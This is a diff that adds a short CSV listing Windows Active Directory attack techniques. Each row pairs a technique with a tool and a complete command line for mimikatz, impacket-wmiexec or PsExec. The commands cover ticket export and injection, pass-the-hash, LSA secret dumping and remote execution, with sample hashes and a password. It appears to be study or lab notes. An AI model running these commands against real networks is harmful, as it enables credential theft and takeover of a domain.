@@ -1,0 +1,5 @@
+PassTheTicket,mimikatz,sekurlsa::tickets /export   ; kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+OverpassTheHash,mimikatz,sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+PassTheHash,impacket-wmiexec, /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+psexec,psexec,./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+goldenticket,mimikatz,lsadump::lsa /patch
